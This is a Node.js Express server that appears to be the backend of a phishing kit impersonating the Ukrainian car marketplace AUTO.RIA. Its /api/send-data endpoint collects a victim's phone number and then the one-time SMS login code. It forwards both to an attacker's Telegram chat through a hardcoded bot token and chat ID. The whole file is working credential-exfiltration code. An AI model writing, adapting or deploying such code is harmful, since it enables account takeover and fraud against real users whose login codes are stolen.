const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === TELEGRAM CONFIG ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ======================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// Екранування для MarkdownV2
const escape = (text) => text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

async function sendToTelegram(message) {
    try {
        const res = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'MarkdownV2'
            })
        });

        if (!res.ok) {
            const err = await res.json();
            console.error('Telegram error:', err);
            return false;
        }
        return true;
    } catch (err) {
        console.error('Send error:', err);
        return false;
    }
}

// API: /api/send-data
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code } = req.body;
    let message = '';

    if (step === 'phone' && phone) {
        // Очищаємо і форматуємо номер
        const clean = phone.replace(/\D/g, '');
        const formatted = clean.startsWith('380') ? `+${clean}` : phone;

        message = `
*AUTO\\.RIA*  
*Номер телефона:* \`${escape(formatted)}\`  
*Страна:* Україна
        `.trim();

    } else if (step === 'code' && code) {
        message = `
*SMS\\-код:*  
\`\`\`
${escape(code)}
\`\`\`
        `.trim();

    } else {
        return res.status(400).json({ success: false });
    }

    const success = await sendToTelegram(message);
    res.json({ success });
});

// Запуск
app.listen(port, () => {
    console.log(`Сервер на порту ${port}`);
});
